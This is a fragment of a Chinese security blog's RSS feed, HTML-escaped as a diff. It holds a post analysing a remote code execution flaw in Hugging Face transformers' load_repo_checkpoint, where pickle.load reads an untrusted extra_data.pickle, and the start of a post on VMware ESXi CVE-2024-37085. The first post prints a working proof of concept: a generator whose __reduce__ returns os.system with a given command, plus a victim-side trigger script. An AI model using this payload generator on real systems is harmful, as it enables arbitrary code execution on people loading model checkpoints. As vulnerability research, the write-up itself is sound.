+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from tensorflow.keras.optimizers import Adam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from transformers import TFAutoModel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 这个模型还是有些⼤的，下载可能会花⼀些时间...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # https://huggingface.co/google-bert/bert-base-uncased/tree/main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model = TFAutoModel.from_pretrained(&amp;#x27;bert-base-uncased&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 把参数修改为checkpoint所在的仓库的路径，注意路径要正确&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;model.load_repo_checkpoint(&amp;#x27;rce-checkpoint&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;让我们跟进去代码看⼀下，这个⽅法完整的实现是下⾯这样⼦，可以看到逻辑⽐较简单，下⾯我们将⼀段⼀段的分 析它：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def load_repo_checkpoint(self, repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Loads a saved checkpoint (model weights and optimizer state) from a repo. Returns &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the current epoch count when&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  the checkpoint was made.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Args:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  repo_path_or_name (`str`):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Can either be a repository name for your &amp;#123;object&amp;#125; in the Hub or a path to &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a local folder (in which case&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  the repository will have the name of that local folder).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Returns:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            `dict`: A dictionary of extra metadata from the checkpoint, most commonly an &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;epoch&amp;quot; count.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if getattr(self, &amp;quot;optimizer&amp;quot;, None) is None:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise RuntimeError(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;quot;Checkpoint loading failed as no optimizer is attached to the model. &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;quot;This is most likely caused by the model not being compiled.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if os.path.isdir(repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo_path_or_name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            # If this isn&amp;#x27;t a local path, check that the remote repo exists and has a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint in it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo_files = list_repo_files(repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for file in (&amp;quot;checkpoint/weights.h5&amp;quot;, &amp;quot;checkpoint/extra_data.pickle&amp;quot;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                if file not in repo_files:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    raise FileNotFoundError(f&amp;quot;Repo &amp;#123;repo_path_or_name&amp;#125; does not contain &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint file &amp;#123;file&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo = Repository(repo_path_or_name.split(&amp;quot;/&amp;quot;)[-1], &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clone_from=repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo.local_dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Now make sure the repo actually has a checkpoint in it.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        checkpoint_dir = os.path.join(local_dir, &amp;quot;checkpoint&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        weights_file = os.path.join(checkpoint_dir, &amp;quot;weights.h5&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(weights_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file weights.h5 in repo &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        extra_data_file = os.path.join(checkpoint_dir, &amp;quot;extra_data.pickle&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(extra_data_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file extra_data.pickle in &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;repo &amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Assuming the repo is real and we got a checkpoint, load the weights and the &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;optimizer state into the model.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # The optimizer state includes the iteration count, so learning rate schedules &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;should resume as normal too.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.load_weights(weights_file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        with open(extra_data_file, &amp;quot;rb&amp;quot;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            extra_data = pickle.load(f)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.optimizer.set_weights(extra_data[&amp;quot;optimizer_state&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Finally, return the epoch number from the checkpoint. This isn&amp;#x27;t a property of &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the model, so we can&amp;#x27;t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # set it directly, but the user can pass it to fit().&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return &amp;#123;&amp;quot;epoch&amp;quot;: extra_data[&amp;quot;epoch&amp;quot;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;⾸先这部分是对模型⾃身的设置进⾏检查，这就要求模型使⽤的时候必须要配置了 optimizer：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if getattr(self, &amp;quot;optimizer&amp;quot;, None) is None:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          raise RuntimeError(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;quot;Checkpoint loading failed as no optimizer is attached to the model. &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;quot;This is most likely caused by the model not being compiled.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;所以我们的 poc 代码⾥也为模型配置了 optimizer：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;紧接着对传⼊的⽂件夹的合法性进⾏检查，⽐如必须是⼀个⽬录⽂件，必须存在 checkpoint/weights.h5 和 checkpoint/extra_data.pickle 这两个⽂件：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;        if os.path.isdir(repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo_path_or_name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            # If this isn&amp;#x27;t a local path, check that the remote repo exists and has a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint in it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo_files = list_repo_files(repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for file in (&amp;quot;checkpoint/weights.h5&amp;quot;, &amp;quot;checkpoint/extra_data.pickle&amp;quot;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                if file not in repo_files:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    raise FileNotFoundError(f&amp;quot;Repo &amp;#123;repo_path_or_name&amp;#125; does not contain &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint file &amp;#123;file&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo = Repository(repo_path_or_name.split(&amp;quot;/&amp;quot;)[-1], &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clone_from=repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo.local_dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Now make sure the repo actually has a checkpoint in it.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        checkpoint_dir = os.path.join(local_dir, &amp;quot;checkpoint&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        weights_file = os.path.join(checkpoint_dir, &amp;quot;weights.h5&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(weights_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file weights.h5 in repo &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        extra_data_file = os.path.join(checkpoint_dir, &amp;quot;extra_data.pickle&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(extra_data_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file extra_data.pickle in &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;repo &amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;再然后，开始读取： extra_data.pickle 反序列化，就来到了我们熟悉的 pickle.load (f) 环节，在这⼀步，产⽣ 了 RCE&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;with open(extra_data_file, &amp;quot;rb&amp;quot;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; extra_data = pickle.load(f)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; self.optimizer.set_weights(extra_data[&amp;quot;optimizer_state&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # Finally, return the epoch number from the checkpoint. This isn&amp;#x27;t a property of &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the model, so we can&amp;#x27;t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # set it directly, but the user can pass it to fit().&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; return &amp;#123;&amp;quot;epoch&amp;quot;: extra_data[&amp;quot;epoch&amp;quot;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;让我们来看⼀下这个 extra_data.pickle ⽂件是如何⽣成的，这⾥定义了⼀个类，然后为这个类创建了⼀个对象 并 dump 到了硬盘上，在这个类上有⼀个特殊的 &lt;strong&gt;reduce&lt;/strong&gt; ⽅法，在 pickle 的规范约定中，反序列化时会调⽤类上 的__reduce__⽅法，所以就 RCE：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def generate_extra_data_pickle(filepath, command):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;⽣成extra_data.pickle⽂件，这个⽂件被加载的时候会执⾏给定的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :param filepath: extra_data.pickle⽂件的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :param command: 要执⾏的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :return:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; class CommandExecute:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在 pickle.load(f) 的时候，此处的命令会被执⾏&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :return:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; return os.system, (command,)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; poc = CommandExecute()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; with open(filepath, &amp;#x27;wb&amp;#x27;) as fp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; pickle.dump(poc, fp)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;官⽅的修复似乎是把这个⽅法删除掉了？草没看明⽩…&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/huggingface/transformers/commit/693667b8ac8138b83f8adb6522ddaf42fa07c125&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/10/28/VMware%20ESXi%20CVE-2024-37085/</guid>
+            <title>VMware ESXi CVE-2024-37085漏洞验证分析</title>
+            <link>http://example.com/2024/10/28/VMware%20ESXi%20CVE-2024-37085/</link>
+            <category>漏洞复现</category>
+            <pubDate>Mon, 28 Oct 2024 09:18:34 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/b906bb43fbf2b211b9e52d27c78065380dd78e4b.jpg&#34; alt=&#34;device&#34;&gt;&lt;/p&gt;
